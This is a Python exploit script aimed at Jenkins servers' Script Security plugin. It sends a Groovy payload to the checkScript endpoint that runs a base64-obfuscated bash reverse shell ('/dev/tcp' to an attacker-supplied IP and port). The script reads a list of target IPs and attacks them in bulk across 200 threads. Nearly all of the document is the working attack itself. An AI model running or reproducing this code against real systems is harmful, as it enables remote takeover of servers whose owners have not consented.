import requests
import sys
import queue
import threading
import binascii
import base64

class test():
	def __init__(self,attackip,attackport):
		self.attackport=attackport
		self.attackip=attackip


	def post(self,ip):
		# with open(self.file,mode='rb') as f:
		# 	file=f.read()
		attackip=self.attackip
		port=self.attackport
		a='bash -i >& /dev/tcp/'+attackip+'/'+port+' 0>&1'
		payload='bash -c {echo,'+base64.b64encode(a.encode()).decode()+'}|{base64,-d}|{bash,-i}'
		target='http://'+ip+':8080'+'/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value='+'public class x{public x(){new String("%s".decodeHex()).execute()}}' % binascii.b2a_hex(payload.encode()).decode()
		print(target)
		r=requests.get(target)
		print(r.content)
		if r.status_code == 200:
			print("success")
		else:
			print("failed"+str(r.status_code))

	def worker(self,q):
		while not q.empty():
			ip=q.get()
			try:
				self.post(ip)
			finally:
				q.task_done()


if __name__ == '__main__':
	print("Example: python xx.py 192.168.0.1 attackip attackport")
	print("attackip即为反弹的攻击机的ip")
	# if len(sys.argv)!=3:
	# 	print("format wrong")
	# 	sys.exit()

	q=queue.Queue()
	a=test(sys.argv[2],sys.argv[3])
	ip=sys.argv[1]
	# file=sys.argv[2]
	# iplist=[]
	with open(ip,mode='rb') as ipf:
		for line in ipf.readlines():
			# print(line.decode('utf-8'))
			q.put(line.decode('utf-8')[:-2])
			# iplist.append(line.decode('utf-8'))
	threads=[threading.Thread(target=a.worker,args=(q,)) for i in range(200)]
	list(map(lambda x:x.start(),threads))
	q.join()
	print("scan over")
	# while not q.empty():
	# 		print(q.get())

		# print(str(ipf.readline()))
		# while q.put(ipf.readline())!=None:
		# 	print (q.get())

	# a=test(ip,file)
	# a.post()